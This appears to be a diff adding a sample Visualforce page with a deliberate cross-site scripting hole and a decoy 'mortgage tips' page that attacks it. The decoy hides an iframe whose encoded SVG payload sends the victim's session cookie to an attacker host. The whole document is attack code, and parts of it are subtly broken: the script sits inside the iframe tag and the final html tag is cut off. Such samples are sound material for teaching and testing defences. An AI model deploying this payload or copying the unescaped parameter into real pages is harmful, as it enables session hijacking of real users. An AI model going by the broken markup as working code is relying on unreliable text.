@@ -1,0 +1,22 @@
+<apex:page>
+<!-- Vulnerable Page at https://example.com/api/search -->
+<div id='greet'></div>
+<script>
+document.querySelector('#greet').innerHTML='You searched for
+<b>{!$CurrentPage.parameters.q}</b>';
+</script>
+</apex:page>
+<html>
+<!-- Evil Page -->
+<body>
+<h1>Ten Ways to Pay Down Your Mortgage</h1>
+<iframe id='attack' style='visibility:hidden'>
+<script>
+var payload = "\x3csvg
+onload=\x27document.location.href=\x22http://cybervillians.com?session=\x22+document.cookie\x27\x3e";
+document.querySelector('#attack').src =
+"https://example.com/api/search?q=" +
+encodeURIComponent(payload);
+</script>
+</body>
+</html
